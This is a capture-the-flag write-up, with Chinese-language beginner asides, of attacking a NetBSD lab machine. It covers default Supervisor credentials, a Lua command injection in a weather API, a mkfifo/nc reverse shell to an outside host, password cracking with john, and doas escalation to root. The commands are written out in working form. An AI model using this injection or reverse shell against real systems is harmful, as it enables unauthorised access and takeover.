Port 80 requires HTTP Basic authentication. Port 9001 runs Supervisor, a process manager with a web interface.

Supervisor — Default Credentials

Default credentials user:123 grant access to the Supervisor dashboard on port 9001.

🧒 儿童版 — 路由器默认密码 Supervisor 是一个管理后台程序的工具，类似"任务管理器"。管理员没改默认密码，就像买了新路由器但一直用 admin/admin 一样。

Process Logs Leak Internal Service

The Supervisor process list reveals a development server running as r.michaels:

r.michaels 603 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001
  -L weather /home/r.michaels/devel/webapi/weather.lua
  -P /var/run/httpd_devel.pid -U r.michaels
  -b /home/r.michaels/devel/www
Key flags -u enables user directory access (/~user/ → ~/public_html/). -X enables directory listing. -i 127.0.0.1 -I 3001 means it only listens on localhost. The weather API is backed by a Lua script.
Phase 1

Initial Access — Lua Command Injection

Discover the Weather API

$ gobuster dir -u http://10.129.49.136/weather \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/forecast  (Status: 200)

$ curl -s http://10.129.49.136/weather/forecast
{"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}

$ curl -s "http://10.129.49.136/weather/forecast?city=list"
{"code": 200, "cities": ["London","Manchester","Birmingham",...]}

Inject os.execute via city Parameter

$ curl -s "http://10.129.49.136/weather/forecast?city=')+os.execute('id')+--"
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
🧒 儿童版 — 城市名里藏命令 天气 API 把你输入的城市名直接拼进了 Lua 代码里执行。正常输入 London，代码就是"查询 London 的天气"。但你输入 ') + os.execute('id') + --，代码就变成了"查询完后执行 id 命令"。-- 是 Lua 的注释符，把后面多余的代码注释掉防止报错。

Reverse Shell (mkfifo — no bash on NetBSD)

$ curl "http://10.129.49.136/weather/forecast?city=')+os.execute('rm+/tmp/pbf;mkfifo+/tmp/pbf;cat+/tmp/pbf|/bin/sh+-i+2>%261|nc+10.10.15.65+4444+>/tmp/pbf')+--"

# Listener
$ nc -lvnp 4444
_httpd@luanne:/$
NetBSD shell differences NetBSD doesn't have bash — use /bin/sh. The mkfifo reverse shell pattern works across all Unix-like systems: create a named pipe, read from it into a shell, and send stdout/stderr back through nc.

$ curl --user webapi_user:iamthebest localhost:3001/~r.michaels/
<a href="id_rsa">id_rsa</a>  16-Sep-2020 16:52  3kB

Phase 3

Privilege Escalation — Encrypted Backup → doas root

Decrypt Backup with netpgp

luanne$ ls ~/backups/

luanne$ cp ~/backups/devel_backup-2020-09-16.tar.gz.enc /tmp/
luanne$ cd /tmp

luanne$ tar xvzf devel_backup-2020-09-16.tar.gz

Crack Backup .htpasswd

$ john --wordlist=/usr/share/wordlists/rockyou.txt g.hash
littlebear       (webapi_user)

doas → root

# doas.conf allows r.michaels to run commands as root

luanne$ doas sh

root
# cat /root/root.txt

🧒 儿童版 — NetBSD 的 sudo 叫 doas 这台机器运行的是 NetBSD，不是 Linux。NetBSD/OpenBSD 用 doas 代替 sudo——功能一样，都是"借用 root 权限"。doas.conf 里写着"允许 r.michaels 以 root 身份执行命令"，密码就是从备份里破解出来的 littlebear。
Appendix

Key Takeaways

Always try default credentials on management panels.

Supervisor (user:123), Tomcat (tomcat:tomcat), Jenkins (no password) — admin panels with default creds are one of the most common initial footholds. Process logs often reveal internal services, paths, and architecture.

Lua command injection follows the same pattern as SQLi.

Close the existing expression with '), inject os.execute('cmd'), then comment out the rest with --. Any language that concatenates user input into evaluated code is vulnerable.

bozohttpd -u flag exposes user home directories.

/~username/ maps to ~/public_html/. Combined with directory listing (-X), any file in that directory is accessible — including SSH keys that shouldn't be there.

Know your OS: NetBSD ≠ Linux.

NetBSD uses doas instead of sudo, netpgp instead of gpg, /bin/sh instead of /bin/bash. Enumeration scripts like LinPEAS still work but check /etc/doas.conf manually — it's the first thing to look for on BSD systems.

Encrypted backups often contain different-version credentials.

Dev vs prod passwords frequently differ. A backup's .htpasswd may have a password that works for doas/sudo even when the current one doesn't.
